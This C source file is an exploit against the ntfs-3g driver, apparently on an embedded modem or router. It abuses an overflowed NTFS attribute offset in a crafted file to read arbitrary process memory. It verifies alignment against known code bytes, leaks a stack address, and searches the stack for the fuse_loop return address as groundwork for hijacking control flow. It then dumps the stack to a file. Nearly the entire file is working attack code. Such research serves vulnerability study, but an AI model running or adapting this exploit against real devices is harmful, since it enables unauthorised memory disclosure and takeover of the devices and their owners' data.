#include <stdio.h>
#include <stdlib.h>

#define _GNU_SOURCE
#define __USE_GNU 1

#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdint.h>
#include <string.h>
#include <stdbool.h>

// Switch byte order if different endianess than the modem's cpu
#if __BYTE_ORDER__ == __ORDER_BIG_ENDIAN__
#  define BE32(r) (r)
#else
#  define BE32(r) (__builtin_bswap32(r))
#endif

// Files with different attribute offsets
// We need to use an attribute offset so that:
//   heap_allocated_addr + attrib_offset % 0x1000 == 0
char *paths[] = {
    "smb/file",
};

// With ntfs prepared offset 0 it matches bytes of 0x408660 with offset 0xffbc19a0
// Offset to overflow the pointer back to address 0x00
#define OFFSET_OVERFLOW 0xffbb1000

// Part of /bin/ntfs-3g which can be used to check if the attribute offset is correct
// Which attribute offset will be correct depends on which address we'll get during heap allocation
// If it's correct we can switch to another file with a different attribute offset
// 0x4064b4
#define ADDR_IDENT 0x4064b4

// Offset to a mount_dst string pointer
// It's stored in ntfs-3g data section (which address is static) and points to the
// stack, so it can be used to obtain the stack address
#define ADDR_MOUNT_DST_PTR 0x418a00

// Address of the fuse_loop return address that should be on the stack
#define FUSE_LOOP_RET_ADDR "\x00\x40\x64\xc4"

// 7fd7df1e -> | 0xfff + 1 -> 7fd7dfff + 1 -> 7fd7e000 - a18 = 0x7FD7D5E8

int exploit_read(int fd, void* buf, size_t size, uint64_t addr)
{
    // just a fancy pread that takes care of the offsets and prints debug info
    // addr is the absolute memory address
    // In case of an error it exits, ntfs-3g is now probably dead anyway
    uint32_t offset = (uint32_t)((OFFSET_OVERFLOW + addr) & 0xffffffff);

    int ret = pread(fd, buf, size, offset);
    if (ret == -1)
    {
        printf("%llx: ERROR READING FROM ADDR_REL = %llx\n", addr, offset);
        printf("NTFS-3G probably now segfaulted\n");
        printf("Reinsert the usb stick to restart it\n");
        exit(1);
    }

    printf("%lx -> ", addr);
    if (ret > 8) printf("\n");
    bool skipping = false;
    for (int i = 0; i < ret; i++)
    {
        if ((i) % 16 == 0)
        {
            // Start of the line
            //
            // Skip if empty
            if ((ret - i > 16)
                    && (memcmp(buf+i, "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 16) == 0))
            {
                if (skipping)
                {
                    continue;
                } else
                {
                    skipping = true;
                    printf("*\n");
                    continue;
                }
            } else
            {
                skipping = false;
            }

            // Address prefix
            printf("\033[32m%08x (+%04x):\033[0m ", addr + i, i);
        }

        if (skipping) continue;

        // Actual data
        printf("%02x", ((unsigned char*)buf)[i]);

        // Spaces between words
        if ((i+1) % 4 == 0) printf(" ");

        // Ascii representation at the end of the hex line
        if ((i+1) % 16 == 0)
        {
            printf("    \033[90m|\033[0m    ");

            for (int j = 0; j < 16; j++)
            {
                char cur_char = ((char*)buf)[i-15 + j];

                if ((cur_char >= 0x20) && (cur_char <= 0x7e))
                    // Printable
                    printf("%c", cur_char);
                else
                    // Non printable
                    printf("\033[90m.\033[0m");
            }

            printf("\n");
        }
    }

    printf("\n");

    return ret;
}

bool exploit_verify_alignment(int fd)
{
    // Verifies the alignment
    // Returns 1 if alignment is good
    // Returns 0 if unexpected data was found (wrong alignment)
    unsigned char ident[64];
    int ret = exploit_read(fd, ident, sizeof(ident), ADDR_IDENT);

    // What normally should be at ADDR_IDENT
    const unsigned char ident_good[] = {
        0x8f, 0xbc, 0x00, 0x28, 0x8f, 0x99, 0x80, 0x60,
        0x03, 0x20, 0xf8, 0x09, 0x02, 0x00, 0x20, 0x21,
        0x8f, 0xbc, 0x00, 0x28, 0x8f, 0x82, 0x80, 0x18,
        0x8f, 0x99, 0x81, 0xb4, 0x8c, 0x43, 0x8a, 0x0c,
        0x8f, 0x82, 0x80, 0x18, 0x8c, 0x65, 0x00, 0x40,
        0x03, 0x20, 0xf8, 0x09, 0x8c, 0x44, 0x8a, 0x00,
        0x8f, 0xbc, 0x00, 0x28, 0x8f, 0x99, 0x81, 0x2c,
        0x03, 0x20, 0xf8, 0x09, 0x02, 0x00, 0x20, 0x21,
    };
    
    bool correct = memcmp(ident, ident_good, sizeof(ident)) == 0;
    if (correct)
        printf("\033[32mCorrect alignment:\033[0m ");
    else
        printf("\033[31mIncorrect alignment:\033[0m ");

    for(int i = 0; i < sizeof(ident); i++)
        printf("%02x", ident[i]);

    printf("\n\n");

    return correct;
}

int exploit_open_mem()
{
    printf("Finding a file with correctly aligned data offset\n");

    for (int i = 0; i < sizeof(paths) / sizeof(*paths); i++)
    {
        printf("Trying %s\n", paths[i]);
        int fd = open(paths[i], O_RDWR | O_DIRECT);
        if (fd == -1)
        {
            printf("Error opening %s\n", paths[i]);
            exit(1);
        }

        bool correct = exploit_verify_alignment(fd);

        if (correct)
        {
            return fd;
        } else
        {
            close(fd);
        }
    }

    printf("Couldn't find a correct attribute alignment!\n");
    printf("If you've already set the offset using ntfs_edit_offset.py "
           "and the --ident parameter then unplugging and plugging back "
           "in the usb stick might resolve the issue.\n");
    printf("If you haven't, then use ntfs_edit_offset.py with the "
           "--ntfs-3g and --ident parameters. Ident should be set to "
           "the hex string above.\n");
    exit(1);
}

int main()
{
    int fd = exploit_open_mem();

    uint32_t mnt_dst_ptr;
    printf("mnt_dst_ptr: ");
    exploit_read(fd, &mnt_dst_ptr, sizeof(mnt_dst_ptr), ADDR_MOUNT_DST_PTR);
    mnt_dst_ptr = BE32(mnt_dst_ptr);
    if (mnt_dst_ptr == 0)
    {
        printf("mnt_dst_ptr is 0! Something went wrong!\n");
        exit(1);
    }

    uint32_t stack_top;
    stack_top = (mnt_dst_ptr | 0xfff) + 1;
    printf("stack_top: %llx\n", stack_top);   

    // Read stack to get find the address of return ptr from fuse_loop
    uint32_t stack_to_read = 0x3000;
    unsigned char* stack = malloc(stack_to_read);
    
    uint32_t deadzone = (-OFFSET_OVERFLOW) & 0xfff;
    uint32_t zone_base = stack_top - stack_to_read - deadzone - 4;

    printf("\n");
    printf("Reading stack from %llx, (deadzone: %llx):\n", zone_base, deadzone);
    int read_amount = exploit_read(fd, stack, stack_to_read, zone_base);
    
    printf("read %d bytes\n", read_amount);

    void* ret_ptr_abs = memmem(stack, stack_to_read, FUSE_LOOP_RET_ADDR, 4);
    
    if (ret_ptr_abs == NULL) {
        printf("Miss\n");
    } else {
        unsigned char * ptr = (unsigned char *) ret_ptr_abs;
        printf("Hit at %llx\n", zone_base + (ptr - stack));
    }
    
    int stack_fd = open("stack_dump.bin", O_RDWR | O_DIRECT | O_CREAT);
    pwrite(stack_fd, stack, read_amount, 0);
    close(stack_fd);

    free(stack);
    close(fd);
}
